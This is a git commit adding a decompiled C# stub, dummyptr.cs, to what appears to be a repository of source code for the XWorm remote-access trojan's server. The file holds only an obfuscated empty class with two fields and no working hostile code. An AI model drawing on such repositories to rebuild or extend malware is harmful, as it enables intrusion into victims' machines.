4621d3d9fbc9066b7563329250cf18346199d298
h1ercarbohydratemap11 <xcytrizen@outlook.com>
2025-09-18 13:49:50 +0400

    dummyptr.cs

---
+++ XWorm V5.6/Server/dummy/dummyptr.cs
@@ -0,0 +1,16 @@
+﻿// Decompiled with JetBrains decompiler
+// Type: dummy_ptr.{f5564a4f-63ef-414d-96cb-a5ab2ef0d756}
+// Assembly: XWorm, Version=5.2.0.0, Culture=neutral, PublicKeyToken=null
+// MVID: E9214EC1-9B0A-48D0-B506-E2C08D434AC1
+// Assembly location: C:\Users\UNKNOWN\Desktop\xworm\XWorm V5.2\XWorm V5.2.exe
+
+using System.Reflection;
+
+namespace dummy_ptr
+{
+  internal abstract class \u007Bf5564a4f\u002D63ef\u002D414d\u002D96cb\u002Da5ab2ef0d756\u007D
+  {
+    public static int AC1EB04BC72D73F62AA8D83B0E307614;
+    private static Assembly c;
+  }
+}
